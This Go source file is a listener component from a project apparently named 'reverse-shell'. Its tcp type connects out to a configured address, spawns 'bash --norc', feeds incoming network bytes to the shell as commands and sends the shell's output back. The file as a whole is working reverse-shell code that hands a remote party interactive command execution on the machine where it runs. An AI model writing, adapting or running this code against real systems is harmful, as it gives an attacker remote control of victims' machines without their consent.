package listener

import (
	"bufio"
	"net"
	"time"

	"github.com/maxlaverse/reverse-shell/agents/go/handler"
	"github.com/maxlaverse/reverse-shell/common"
)

type tcp struct {
	processOutput     chan *handler.ProcessOutput
	processTerminated chan *handler.ProcessTerminated
	input             chan []byte
	readerClosed      chan struct{}
	connectionLost    chan struct{}
	address           string
	handler           *handler.Handler
}

func NewTcp(address string) *tcp {
	processOutput := make(chan *handler.ProcessOutput)
	processTerminated := make(chan *handler.ProcessTerminated)

	return &tcp{
		processOutput:     processOutput,
		processTerminated: processTerminated,
		input:             make(chan []byte),
		readerClosed:      make(chan struct{}),
		connectionLost:    make(chan struct{}),
		address:           address,
		handler:           handler.New(processOutput, processTerminated),
	}
}

func (l *tcp) Start() error {
	return nil
}

func (l *tcp) Listen() {
	common.Logger.Debugf("Connecting")
	conn, err := net.Dial("tcp", l.address)
	if err != nil {
		common.Logger.Errorf("Failed to establish connection: %s", err)
		return
	}

	go l.pipeFromProcessOutput(conn)
	go l.pipeToProcessInput(conn)

	processId := l.handler.CreateProcess("bash --norc")

	for {
		select {
		case msg := <-l.input:
			l.handler.ExecuteCommand(processId, msg)
		case <-l.readerClosed:
			common.Logger.Debugf("Lost connection. Stopping the pipeFromProcessOutput loop")
			l.connectionLost <- struct{}{}
			common.Logger.Debugf("Main Loop stopped")
			return
		}
	}
}

func (t *tcp) pipeToProcessInput(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(600 * time.Second))
	if err != nil {
		common.Logger.Debugf("SetReadDeadline failed:", err)
		t.readerClosed <- struct{}{}
		conn.Close()
		return
	}

	for {
		recvBuf := make([]byte, 1024)
		size, err := bufio.NewReader(conn).Read(recvBuf)
		if err != nil {
			common.Logger.Debugf("Error while reading data from tcp connection: %s", err)
			t.readerClosed <- struct{}{}
			conn.Close()
			break
		}
		t.input <- recvBuf[0:size]
	}
}

func (l *tcp) pipeFromProcessOutput(conn net.Conn) {
PipeLoop:
	for {
		select {
		case a := <-l.processOutput:
			conn.Write([]byte(a.Result))

		case <-l.connectionLost:
			common.Logger.Debugf("Received a connectionLost signal! Stopping the loop")
			break PipeLoop

		case <-l.processTerminated:
			common.Logger.Debugf("Received a processTerminated signal! Closing connection")
			conn.Write([]byte("Process terminated\n"))
			conn.Close()
		}
	}
}
